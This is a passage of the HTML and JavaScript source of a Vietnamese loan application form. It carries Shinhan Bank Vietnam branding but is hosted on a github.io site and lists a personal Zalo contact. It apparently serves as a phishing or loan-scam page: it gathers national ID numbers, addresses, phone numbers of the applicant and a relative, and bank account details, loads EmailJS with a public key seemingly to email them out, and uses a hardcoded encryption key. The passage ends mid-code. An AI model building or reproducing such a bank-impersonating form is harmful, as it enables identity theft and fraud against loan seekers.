                                <img src="https://yt3.googleusercontent.com/MJFg375kZKRaEy1Sma9U0EcUWS0YsWYKPZAVvYoYtyoHZD83KraSyS-Pi4KICFh6-K8qG6nL5Ys=s900-c-k-c0x00ffffff-no-rj" alt="VietBank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng TMCP Việt Nam Thương Tín (VietBank)
                            </div>
                            <div class="custom-select-option" data-value="abbank">
                                <img src="https://whypay.vn/assets/images/nganhang/abbank.png" alt="ABBank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng TMCP An Bình (ABBank)
                            </div>
                            <div class="custom-select-option" data-value="dbs">
                                <img src="https://media-cdn-v2.laodong.vn/Storage/NewsPortal/2023/2/6/1144878/Logo-Ngan-Hang-Dbs-B.png" alt="DBS Bank Vietnam Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                DBS Bank Việt Nam (DBSBank)
                            </div>
                            <div class="custom-select-option" data-value="hsbc">
                                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/aa/HSBC_logo_%282018%29.svg/2560px-HSBC_logo_%282018%29.svg.png" alt="HSBC Vietnam Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng TNHH MTV HSBC Việt Nam (HSBC)
                            </div>
                            <div class="custom-select-option" data-value="standardchartered">
                                <img src="https://s-vnba-cdn.aicms.vn/vnba-media/23/8/11/logo-sc_64d5f750369dd.jpg" alt="Standard Chartered Vietnam Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng TNHH MTV Standard Chartered Việt Nam (Standardchartered)
                            </div>
                            <div class="custom-select-option" data-value="uob">
                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcTF13z7VJzPzrnjcAOO_m1O-ClWz0owEZ9MyQ&s" alt="UOB Vietnam Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng TNHH MTV United Overseas Bank Việt Nam (UOB)
                            </div>
                            <div class="custom-select-option" data-value="cimb">
                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSzfC0c93iQpxy2esdGztajlGJMuWoJVF2Kvw&s" alt="CIMB Vietnam Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng TNHH MTV CIMB Việt Nam (Cimbank)
                            </div>
                            <div class="custom-select-option" data-value="publicbank">
                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcRFCU8CUoBbMq-H0pSbmRwt1iSB4qqoSf86zA&s" alt="Public Bank Vietnam Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng TNHH MTV Public Bank Việt Nam (Publicbank)
                            </div>
                            <div class="custom-select-option" data-value="hongleongbank">
                                <img src="https://play-lh.googleusercontent.com/xMbJaBvkQuvx6WLCvZlO9WYv59ZFE2877xnZFigi2rj5CMwtQfQKHZp0i-xXC5-H_bE" alt="Hong Leong Bank Vietnam Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng TNHH MTV Hong Leong Việt Nam (Hongleongbank)
                            </div>
                            <div class="custom-select-option" data-value="wooribank">
                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcR8sNsrpQ4B_Z5eR2vSWcJXYZPXg280TX07_w&s" alt="Woori Bank Vietnam Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng TNHH MTV Woori Việt Nam (Wooribank)
                            </div>
                            <div class="custom-select-option" data-value="oceanbank">
                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcRPUZ7PcFhkdcYgVQm6u7JPrCUzNgo1jgnSmw&s" alt="OceanBank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng TNHH MTV Đại Dương (OceanBank)
                            </div>
                            <div class="custom-select-option" data-value="gpbank">
                                <img src="https://static.ybox.vn/2022/4/1/1650273410233-nguyen14qbi9-avatar.png" alt="GPBank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng TNHH MTV Dầu khí Toàn cầu (GPBank)
                            </div>
                            <div class="custom-select-option" data-value="cbbank">
                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcR4kGeSM3aasLxkcuu802o2JOzoPFeUte-3lA&s" alt="CBBank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng TNHH MTV Xây dựng (CBBank)
                            </div>
                            <div class="custom-select-option" data-value="vbsp">
                                <img src="https://play-lh.googleusercontent.com/XkaRbfpJt10EoVoAopfQoDlWNXvziTzRKg3S89FMFX8RGo3ur_RRb29P8Y_HF99IRbGa" alt="VBSP Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng Chính sách Xã hội Việt Nam (VBSP)
                            </div>
                            <div class="custom-select-option" data-value="vdb">
                                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a2/Logo_vdb.jpg" alt="VDB Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng Phát triển Việt Nam (VDB)
                            </div>
                            <div class="custom-select-option" data-value="coopbank">
                                <img src="https://s-vnba-cdn.aicms.vn/vnba-media/23/8/2/coopbank_64ca2895d8a4f.png" alt="Co-op Bank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng Hợp tác xã Việt Nam (Co-op Bank)
                            </div>
                            <div class="custom-select-option" data-value="bacabank">
                                <img src="https://finance.vietstock.vn/image/BAB" alt="Bac A Bank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng TMCP Bắc Á (Bac A Bank)
                            </div>
                            <div class="custom-select-option" data-value="ncb">
                                <img src="https://images.careerviet.vn/employers_pro/154592/1720750094_154592_logo.png" alt="NCB Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng TMCP Quốc Dân (NCB)
                            </div>
                            <div class="custom-select-option" data-value="saigonbank">
                                <img src="https://upload.wikimedia.org/wikipedia/commons/3/3f/Logo_SaigonBank.png" alt="Saigonbank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng TMCP Sài Gòn Công Thương (Saigonbank)
                            </div>
                            <div class="custom-select-option" data-value="vietabank">
                                <img src="https://s-vnba-cdn.aicms.vn/vnba-media/23/8/17/vietabank-logo_64de38af0f23f.jpg" alt="Viet A Bank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng TMCP Việt Á (Viet A Bank)
                            </div>
                            <div class="custom-select-option" data-value="vietcapitalbank">
                                <img src="https://finance.vietstock.vn/image/BVB" alt="Viet Capital Bank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng TMCP Bản Việt (Viet Capital Bank)
                            </div>
                            <div class="custom-select-option" data-value="vikkibank">
                                <img src="https://finance.vietstock.vn/image/VikkiBankS" alt="Vikki Bank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng TNHH MTV Số Vikki (Vikki Bank)
                            </div>
                            <div class="custom-select-option" data-value="lpbank">
                                <img src="https://upload.wikimedia.org/wikipedia/commons/2/22/Logo-chinh-thuc-Ngan-hang-Loc-Phat-Viet-Nam-1024x379.png" alt="LPBank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng TMCP Lộc Phát Việt Nam (LPBank)
                            </div>
                            <div class="custom-select-option" data-value="mbv">
                                <img src="https://cdn.thuviennhadat.vn//upload/hinh-anh-bai-viet/NHN/Thang-02-2025/04-03/mbv-la-ngan-hang-gi-tien-than-cua-ngan-hang-mbv-la-oceanbank.jpg" alt="MBV Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng TNHH MTV Việt Nam Hiện Đại (MBV)
                            </div>
                            <div class="custom-select-option" data-value="vcbneo">
                                <img src="https://tttctt.1cdn.vn/thumbs/1200x630/2025/01/22/screen-shot-2025-01-22-at-06-3-3361-1192-1737503084.png" alt="VCBNeo Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng TNHH MTV Ngoại thương Công nghệ số (VCBNeo)
                            </div>
                            <div class="custom-select-option" data-value="indovinabank">
                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcRwLlw1qFMlrQSpS6cGiqNL1mEfk7sEQ_2-Dg&s" alt="Indovina Bank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng TNHH Indovina (Indovina Bank)
                            </div>
                            <div class="custom-select-option" data-value="vietnamrussiabank">
                                <img src="https://vrbank.com.vn/Uploads/Logo_LienKet/logo-VRB.png" alt="Vietnam-Russia Bank Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Ngân hàng Liên doanh Việt – Nga (Vietnam-Russia Bank)
                            </div>
                            <div class="custom-select-option" data-value="anzvietnam">
                                <img src="https://www.caodangvietmy.edu.vn/wp-content/uploads/2014/05/a5e656a3-1ca1-46dd-a96c-156d8be207c3-anz-logo-1024x1024.jpg" alt="ANZ Vietnam Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                ANZ Vietnam (ANZ)
                            </div>
                            <div class="custom-select-option" data-value="citibankvietnam">
                                <img src="https://cdn.iconscout.com/icon/free/png-256/free-citi-logo-icon-download-in-svg-png-gif-file-formats--bank-payment-method-gateway-logos-pack-icons-675714.png?f=webp&w=256" alt="Citibank Vietnam Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Citibank Vietnam (Citibank)
                            </div>
                            <div class="custom-select-option" data-value="kookminbankvietnam">
                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcR-K_tILLruPVwElDRsaRWGCpM0I0CEda-8yg&s" alt="Kookmin Bank Vietnam Logo" class="bank-logo" onerror="this.src='https://via.placeholder.com/30'">
                                Kookmin Bank Vietnam (Kookminbank)
                            </div>
                        </div>
                        <input type="hidden" id="bankName" name="bankName" required>
                        <div class="invalid-feedback" id="bankNameError"></div>
                    </div>
                </div>
            </div>

            <hr class="section-divider">

            <div class="mb-2">
                <label class="section-title">KẾT QUẢ TÍNH TOÁN</label>
                <div id="calculationSummary" class="form-group">
                    <p>Số tiền vay: <span id="calcLoanAmount">0</span> VNĐ</p>
                    <p>Thanh toán hàng tháng: <span id="calcMonthlyPayment">0</span> VNĐ</p>
                    <p>Tổng lãi phải trả: <span id="calcTotalInterest">0</span> VNĐ</p>
                    <p>Tổng gốc + lãi: <span id="calcTotalAmount">0</span> VNĐ</p>
                </div>
                <p id="calculationSuccess" class="success-message">Tính toán hoàn tất!</p>
                <table class="calculation-table">
                    <thead>
                        <tr>
                            <th data-label="Tháng">Tháng</th>
                            <th data-label="Gốc">Gốc (đồng)</th>
                            <th data-label="Lãi">Lãi (đồng)</th>
                            <th data-label="Tổng">Tổng (đồng)</th>
                            <th data-label="Dư nợ">Dư nợ (đồng)</th>
                        </tr>
                    </thead>
                    <tbody id="calculationTable"></tbody>
                </table>
            </div>

            <hr class="section-divider">

            <div class="form-check">
                <input class="form-check-input" type="checkbox" id="privacyConsent" name="privacyConsent" required>
                <label class="form-check-label" for="privacyConsent">
                    Tôi đồng ý với <a href="https://shinhan.com.vn/vi/page/chinh-sach-bao-mat.html" target="_blank">Chính sách bảo mật</a> và <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/dieu-khoan-su-dung.html" target="_blank">Điều khoản sử dụng</a>.
                </label>
                <div class="invalid-feedback" id="privacyConsentError"></div>
            </div>

            <div class="button-group">
                <button type="button" class="btn btn-primary" onclick="calculateLoan()">
                    TÍNH TOÁN
                    <span class="spinner-border spinner-border-sm spinner spinner-calculate" role="status" aria-hidden="true"></span>
                </button>
                <button type="submit" class="btn btn-primary">
                    ĐĂNG KÝ
                    <span class="spinner-border spinner-border-sm spinner spinner-submit" role="status" aria-hidden="true"></span>
                </button>
            </div>
        </form>
    </div>

    <div class="footer">
        <div class="footer-links">
            <a href="https://shinhan.com.vn/vi/page/chinh-sach-bao-mat.html">Chính sách bảo mật</a> |
            <a href="https://zalo.me/84762797077">Liên hệ</a> |
            <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/dieu-khoan-su-dung.html">Điều khoản sử dụng</a>
        </div>
        <p class="mt-2">Bản quyền © 2017 thuộc về Ngân hàng TNHH MTV SHINHAN Việt Nam. Mọi quyền được bảo lưu.</p>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4.4.1/dist/email.min.js"></script>
    <script>
        try {
            emailjs.init("c-Ms5MjWbitpDBb-E");
            console.log('EmailJS initialized successfully');
        } catch (error) {
            console.error('EmailJS initialization failed:', error);
            alert('Cannot initialize EmailJS. Please check connection or configuration.');
        }

        let userData = {};
        let registeredUsers = JSON.parse(localStorage.getItem('registeredUsers')) || [];

        $(document).ready(function() {
            $('[data-bs-toggle="tooltip"]').tooltip();
            function formatPhoneNumber(input) {
                let value = input.value.trim().replace(/\s/g, '');
                if (value.startsWith('+84')) value = '0' + value.slice(3);
                else if (!value.startsWith('0') && value.length >= 9) value = '0' + value;
                value = value.replace(/[^0-9]/g, '');
                if (value.length > 10) value = value.slice(0, 10);
                input.value = value;
                return /^0[1-9]\d{8}$/.test(value);
            }

            $('#phone, #relativePhone').on('input', function() {
                if (!formatPhoneNumber(this)) {
                    $(this).closest('.form-group').addClass('is-invalid');
                    $(`#${this.id}Error`).text('Số điện thoại không hợp lệ (10 số, bắt đầu bằng 0).');
                } else {
                    $(this).closest('.form-group').removeClass('is-invalid');
                    $(`#${this.id}Error`).text('');
                }
            }).mask('0999999999', {
                translation: { '9': { pattern: /[0-9]/, optional: true } },
                placeholder: "0_________"
            });

            $('#cccd').mask('000000000000');
            $('#accountNumber').mask('00000000000000000000', {
                translation: { '0': { pattern: /[0-9]/, optional: true } }
            });
            $('#dob, #idIssueDate').mask('00/00/0000', {
                onKeyPress: function(value, event) {
                    if (value.match(/^\d{2}$/)) {
                        event.target.value = value + '/';
                    } else if (value.match(/^\d{2}\/\d{2}$/)) {
                        event.target.value = value + '/';
                    }
                }
            });
            $('#monthlyIncome').mask('000,000,000,000', { reverse: true });
            $('#customLoanAmount').mask('000,000,000,000,000,000', { reverse: true });
            $('#disbursementDate').val(getCurrentDate());
            updateInterestRate();
            initCustomBankSelect();

            $('#loanAmount').change(function() {
                const customGroup = $('#customLoanAmountGroup');
                if (this.value === 'other') customGroup.show();
                else {
                    customGroup.hide();
                    $('#customLoanAmount').val('');
                }
            });
        });

        function handleImageError(img, bankName) {
            console.warn(`Failed to load logo for ${bankName}: ${img.src}`);
            img.src = 'https://via.placeholder.com/30?text=Ngân hàng';
            img.alt = `Logo ${bankName}`;
        }

        function initCustomBankSelect() {
            const bankSelect = $('#bank-select');
            const bankToggle = bankSelect.find('.custom-select-toggle');
            const bankList = bankSelect.find('.custom-select-list');
            const bankOptions = bankSelect.find('.custom-select-option');
            const bankInput = $('#bankName');
            const bankError = $('#bankNameError');

            function toggleBankList() {
                bankList.toggleClass('show');
                bankToggle.attr('aria-expanded', bankList.hasClass('show'));
            }

            bankToggle.on('click keydown', function(e) {
                if (e.type === 'click' || e.key === 'Enter' || e.key === ' ') {
                    e.preventDefault();
                    toggleBankList();
                }
            });

            bankOptions.each(function() {
                $(this).on('click keydown', function(e) {
                    if (e.type === 'click' || e.key === 'Enter' || e.key === ' ') {
                        e.preventDefault();
                        const value = $(this).data('value');
                        const text = $(this).text().trim();
                        const imgSrc = $(this).find('img').attr('src');
                        bankToggle.html(`<img src="${imgSrc}" alt="${text} Logo" class="bank-logo">${text}`);
                        bankInput.val(value);
                        bankList.removeClass('show');
                        bankToggle.attr('aria-expanded', 'false');
                        bankSelect.removeClass('is-invalid');
                        bankError.hide();
                        debounceSave();
                    }
                });
            });

            $(document).on('click', function(e) {
                if (!bankSelect.is(e.target) && !bankSelect.has(e.target).length) {
                    bankList.removeClass('show');
                    bankToggle.attr('aria-expanded', 'false');
                }
            });

            $('#registrationForm').on('submit', function(e) {
                if (!bankInput.val()) {
                    bankSelect.addClass('is-invalid');
                    bankError.show().text('Vui lòng chọn ngân hàng.');
                } else {
                    bankSelect.removeClass('is-invalid');
                    bankError.hide();
                }
            });
        }

        function updateInterestRate() {
            const loanType = $('#loanType').val() || userData.loanType || '';
            const interestRate = $('#interestRate');
            const rates = {
                'Vay tín chấp': 12.0,
                'Vay thế chấp': 6.2,
                'Vay mua nhà': 5.5,
                'Vay mua xe': 6.4,
                'Vay tiêu dùng': 10.0,
                'Vay trả góp': 7.2
            };
            const rate = rates[loanType] || 7.0;
            interestRate.val(rate.toFixed(2));
            console.log(`Lãi suất: ${rate}% cho ${loanType || 'mặc định'}`);
            interestRate.trigger('change');
        }

        $('#loanType').change(updateInterestRate);

        $('#interestRate').change(function() {
            $(this).val(parseFloat($(this).val()).toFixed(2));
        });

        function getCurrentDate() {
            const today = new Date();
            const year = today.getFullYear();
            const month = String(today.getMonth() + 1).padStart(2, '0');
            const day = String(today.getDate()).padStart(2, '0');
            return `${year}-${month}-${day}`;
        }

        function checkLocalStorageQuota() {
            try {
                if (!window.localStorage) throw new Error('localStorage not available');
                const testKey = '__test__';
                localStorage.setItem(testKey, 'test');
                localStorage.removeItem(testKey);
                return true;
            } catch (e) {
                console.error('Local storage error:', e);
                alert('Cannot access localStorage. Please check browser settings.');
                return false;
            }
        }

        function saveToLocalStorage() {
            if (!checkLocalStorageQuota()) return false;
            try {
                const encryptedData = CryptoJS.AES.encrypt(JSON.stringify(userData), 'shinhan-secret-key').toString();
                localStorage.setItem('userData', encryptedData);
                console.log('Saved userData to localStorage:', userData);
                return true;
            } catch (error) {
                console.error('Error saving userData to localStorage:', error);
                alert('Error saving data. Please check or contact support.');
                return false;
            }
        }

        function loadUserData() {
            if (!checkLocalStorageQuota()) return;
            try {
                const storedData = localStorage.getItem('userData');
                if (storedData) {
                    userData = JSON.parse(CryptoJS.AES.decrypt(storedData, 'shinhan-secret-key').toString(CryptoJS.enc.Utf8));
                    console.log('Loaded userData from localStorage:', userData);
                    $('#fullName').val(userData.fullName || '');
                    $('#dob').val(userData.dob || '');
                    $('#gender').val(userData.gender || '');
                    $('#contactAddress').val(userData.contactAddress || '');
                    $('#hometown').val(userData.hometown || '');
                    $('#nationality').val(userData.nationality || 'Việt Nam');
                    $('#cccd').val(userData.cccd || '');
                    $('#idIssueDate').val(userData.idIssueDate || '');
                    $('#issuePlace').val(userData.issuePlace || '');
                    $('#phone').val(userData.phone || '');
                    $('#email').val(userData.email || '');
                    $('#loanType').val(userData.loanType || '');
                    $('#loanTerm').val(userData.loanTerm || '');
                    $('#loanAmount').val(userData.loanAmount || '');
                    $('#disbursementDate').val(userData.disbursementDate || getCurrentDate());
                    $('#interestRate').val(userData.interestRate || '7.00');
                    $('#monthlyIncome').val(userData.monthlyIncome || '');
                    $('#occupation').val(userData.occupation || '');
                    $('#loanPurpose').val(userData.loanPurpose || '');
                    $('#relativePhone').val(userData.relativePhone || '');
                    $('#relationship').val(userData.relationship || '');
                    $('#accountName').val(userData.accountName || '');
                    $('#accountNumber').val(userData.accountNumber || '');
                    if (userData.bankName) {
                        const bankOption = $(`.custom-select-option[data-value="${userData.bankName}"]`);
                        if (bankOption.length) {
                            const text = bankOption.text().trim();
                            const imgSrc = bankOption.find('img').attr('src');
                            $('.custom-select-toggle').html(`<img src="${imgSrc}" alt="${text} Logo" class="bank-logo">${text}`);
                            $('#bankName').val(userData.bankName);
                        }
                    }
                    updateInterestRate();
                } else {
                    updateInterestRate();
                }
            } catch (error) {
                console.error('Error loading userData from localStorage:', error);
                updateInterestRate();
            }
        }

        function isValidDate(day, month, year) {
            const date = new Date(year, month - 1, day);
            return date.getDate() === day && date.getMonth() + 1 === month && date.getFullYear() === year;
        }



function validateForm() {
    let isValid = true;
    let firstErrorElement = null;
    const today = new Date();
    today.setHours(0, 0, 0, 0);
    const fields = [
        { id: 'fullName', errorId: 'fullNameError', validation: value => value.trim().length > 2, message: 'Họ và tên phải trùng khớp với CCCD.' },
        { id: 'dob', errorId: 'dobError', validation: value => {
            if (!value) return false;
            const regex = /^\d{2}\/\d{2}\/\d{4}$/;
            if (!regex.test(value)) return false;
            const [day, month, year] = value.split('/').map(Number);
            if (year < 1900 || year > today.getFullYear()) return false;
            if (!isValidDate(day, month, year)) return false;
            return new Date(year, month - 1, day) <= today;
        }, message: 'Ngày sinh hợp lệ (dd/mm/yyyy).' },
        { id: 'gender', errorId: 'genderError', validation: value => value !== '', message: 'Chọn giới tính.' },
        { id: 'contactAddress', errorId: 'contactAddressError', validation: value => value.trim().length > 5, message: 'Địa chỉ thường trú.' },
        { id: 'hometown', errorId: 'hometownError', validation: value => value.trim().length > 5, message: 'Quê quán.' },
        { id: 'nationality', errorId: 'nationalityError', validation: value => value.trim().length > 0, message: 'Nhập quốc tịch.' },
        { id: 'cccd', errorId: 'cccdError', validation: value => /^\d{12}$/.test(value.replace(/\s/g, '')), message: 'CCCD 12 số.' },
        { id: 'idIssueDate', errorId: 'idIssueDateError', validation: value => {
            if (!value) return false;
            const regex = /^\d{2}\/\d{2}\/\d{4}$/;
            if (!regex.test(value)) return false;
            const [day, month, year] = value.split('/').map(Number);
            if (year < 1900 || year > today.getFullYear()) return false;
            if (!isValidDate(day, month, year)) return false;
            return new Date(year, month - 1, day) <= today;
        }, message: 'Ngày cấp hợp lệ (dd/mm/yyyy).' },
        { id: 'issuePlace', errorId: 'issuePlaceError', validation: value => value !== '', message: 'Chọn nơi cấp CCCD.' },
        { id: 'phone', errorId: 'phoneError', validation: value => /^0[1-9]\d{8}$/.test(value.replace(/\s/g, '')), message: 'Số điện thoại không hợp lệ (10 số, bắt đầu 0).' },
        { id: 'relativePhone', errorId: 'relativePhoneError', validation: value => {
    const cleanValue = value.replace(/\s/g, '');
    const personalPhone = $('#phone').val().replace(/\s/g, '');
    if (cleanValue === personalPhone) return false;
    return /^0[1-9]\d{8}$/.test(cleanValue);
}, message: 'Số điện thoại người thân không được trùng số điện thoại cá nhân.' },
        { id: 'email', errorId: 'emailError', validation: value => /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(value), message: 'Email không hợp lệ.' },
        { id: 'loanType', errorId: 'loanTypeError', validation: value => value !== '', message: 'Chọn hình thức vay.' },
        { id: 'loanTerm', errorId: 'loanTermError', validation: value => value !== '', message: 'Chọn thời hạn vay.' },
        { id: 'loanAmount', errorId: 'loanAmountError', validation: value => {
            if (value === 'other') {
                const customValue = $('#customLoanAmount').val().replace(/,/g, '');
                const numValue = parseFloat(customValue);
                return !isNaN(numValue) && numValue >= 10000000;
            }
            return value !== '' && value !== 'other';
        }, message: 'Chọn hoặc nhập số tiền vay (>= 10.000.000 VNĐ).' },
        { id: 'disbursementDate', errorId: 'disbursementDateError', validation: value => {
            if (!value) return false;
            const date = new Date(value);
            return !isNaN(date) && date >= today;
        }, message: 'Ngày giải ngân từ hôm nay trở đi.' },
        { id: 'interestRate', errorId: 'interestRateError', validation: value => {
            const numValue = parseFloat(value);
            return !isNaN(numValue) && numValue >= 5 && numValue <= 15;
        }, message: 'Lãi suất từ 5% đến 15%.' },
        { id: 'monthlyIncome', errorId: 'monthlyIncomeError', validation: value => {
            const cleanValue = value.replace(/,/g, '');
            const numericValue = parseFloat(cleanValue);
            return !isNaN(numericValue) && numericValue >= 3000000;
        }, message: 'Thu nhập từ 3.000.000 VNĐ.' },
        { id: 'occupation', errorId: 'occupationError', validation: value => value !== '', message: 'Chọn nghề nghiệp.' },
        { id: 'loanPurpose', errorId: 'loanPurposeError', validation: value => value !== '', message: 'Chọn mục đích vay.' },
        { id: 'relationship', errorId: 'relationshipError', validation: value => value !== '', message: 'Chọn quan hệ.' },
        { id: 'accountName', errorId: 'accountNameError', validation: value => value.trim().length > 2, message: 'Tên tài khoản trùng khớp đăng ký.' },
        { id: 'accountNumber', errorId: 'accountNumberError', validation: value => /^\d{8,20}$/.test(value.replace(/\s/g, '')), message: 'Số tài khoản từ 8-20 số.' },
        { id: 'bankName', errorId: 'bankNameError', validation: value => value !== '', message: 'Chọn ngân hàng.' },
        { id: 'privacyConsent', errorId: 'privacyConsentError', validation: value => value === true, message: 'Đồng ý chính sách bảo mật.' }
    ];

    fields.forEach(field => {
        const element = document.getElementById(field.id);
        const value = element.type === 'checkbox' ? element.checked : element.value;
        const errorElement = document.getElementById(field.errorId);
        const parent = element.closest('.form-group') || element.closest('.custom-select') || element.parentElement;
        if (!field.validation(value)) {
            errorElement.textContent = field.message;
            errorElement.style.color = '#ff4d4f';
            console.error(`Validation failed for ${field.id}: ${field.message}`);
            if (parent) {
                parent.classList.add('is-invalid');
                if (!firstErrorElement) firstErrorElement = element;
            }
            isValid = false;
        } else {
            errorElement.textContent = '';
            if (parent) parent.classList.remove('is-invalid');
        }
    });

    if (isValid && registeredUsers.includes($('#cccd').val())) {
        const duplicateMessage = 'CCCD đã được đăng ký.';
        console.error('Duplicate CCCD detected:', $('#cccd').val());
        $('#cccdError').text(duplicateMessage).css('color', '#ff4d4f');
        $('#cccd').closest('.form-group').addClass('is-invalid');
        if (!firstErrorElement) firstErrorElement = $('#cccd')[0];
        isValid = false;
    }

    if (!isValid && firstErrorElement) {
        firstErrorElement.scrollIntoView({ behavior: 'smooth', block: 'center' });
        firstErrorElement.focus();
    }

    return isValid;
}

function calculateLoan() {
    console.log('Calculating loan');
    if (!validateForm()) {
        console.log('Validation failed, stopping calculation');
        return;
    }

    const spinner = $('.spinner-calculate');
    const successMessage = $('#calculationSuccess');
    spinner.show();
    successMessage.hide();

    setTimeout(() => {
        const loanAmountValue = $('#loanAmount').val();
        let loanAmount;
        if (loanAmountValue === 'other') {
            const customValue = $('#customLoanAmount').val().replace(/,/g, '');
            loanAmount = parseFloat(customValue);
            if (isNaN(loanAmount) || loanAmount < 10000000) {
                console.error('Invalid custom loan amount:', customValue);
                $('#customLoanAmountError').text('Số tiền vay >= 10.000.000 VNĐ.');
                $('#customLoanAmount').closest('.form-group').addClass('is-invalid');
                $('#customLoanAmount').scrollIntoView({ behavior: 'smooth', block: 'center' });
                $('#customLoanAmount').focus();
                spinner.hide();
                return;
            }
        } else {
            loanAmount = parseFloat(loanAmountValue);
        }

        const loanTerm = parseInt($('#loanTerm').val());
        const interestRate = parseFloat($('#interestRate').val()) / 100 / 12;

        if (isNaN(loanAmount) || isNaN(loanTerm) || isNaN(interestRate)) {
            console.error('Invalid inputs:', { loanAmount, loanTerm, interestRate });
            alert('Kiểm tra giá trị nhập.');
            spinner.hide();
            return;
        }

        const monthlyPayment = (loanAmount * interestRate * Math.pow(1 + interestRate, loanTerm)) / (Math.pow(1 + interestRate, loanTerm) - 1);
        const totalAmount = monthlyPayment * loanTerm;
        const totalInterest = totalAmount - loanAmount;

        $('#calcLoanAmount').text(Math.floor(loanAmount).toLocaleString('vi-VN'));
        $('#calcMonthlyPayment').text(Math.floor(monthlyPayment).toLocaleString('vi-VN'));
        $('#calcTotalInterest').text(Math.floor(totalInterest).toLocaleString('vi-VN'));
        $('#calcTotalAmount').text(Math.floor(totalAmount).toLocaleString('vi-VN'));

        let balance = loanAmount;
        const tableBody = $('#calculationTable').empty();
        const fragment = document.createDocumentFragment();
        for (let month = 1; month <= loanTerm; month++) {
            const interest = balance * interestRate;
            const principal = monthlyPayment - interest;
            balance -= principal;
            const row = document.createElement('tr');
            row.innerHTML = `
                <td data-label="Tháng">${month}</td>
                <td data-label="Gốc">${Math.floor(principal).toLocaleString('vi-VN')}</td>
                <td data-label="Lãi">${Math.floor(interest).toLocaleString('vi-VN')}</td>
                <td data-label="Tổng">${Math.floor(monthlyPayment).toLocaleString('vi-VN')}</td>
                <td data-label="Dư nợ">${Math.floor(balance).toLocaleString('vi-VN')}</td>
            `;
            fragment.appendChild(row);
        }
        tableBody.append(fragment);

        userData.monthlyPayment = monthlyPayment;
        userData.totalInterest = totalInterest;
        userData.totalRepay = totalAmount;
        saveToLocalStorage();

        spinner.hide();
        successMessage.show();
        console.log('Calculation completed');
    }, 1000);
}

function debounce(func, wait) {
    let timeout;
    return function (...args) {
        clearTimeout(timeout);
        timeout = setTimeout(() => func.apply(this, args), wait);
    };
}

function saveFormDataRealTime() {
    const loanAmountValue = $('#loanAmount').val();
    const loanAmount = loanAmountValue === 'other' ? $('#customLoanAmount').val().replace(/,/g, '') : loanAmountValue;
    userData = {
        fullName: $('#fullName').val().trim() || '',
        dob: $('#dob').val() || '',
        gender: $('#gender').val() || '',
        contactAddress: $('#contactAddress').val().trim() || '',
        hometown: $('#hometown').val().trim() || '',
        nationality: $('#nationality').val().trim() || 'Việt Nam',
        cccd: $('#cccd').val().trim() || '',
        idIssueDate: $('#idIssueDate').val() || '',
        issuePlace: $('#issuePlace').val() || '',
        phone: $('#phone').val().trim().replace(/\s/g, '').replace(/^\+84/, '0') || '',
        email: $('#email').val().trim() || '',
        loanType: $('#loanType').val() || '',
        loanTerm: $('#loanTerm').val() || '',
        loanAmount: loanAmount || '',
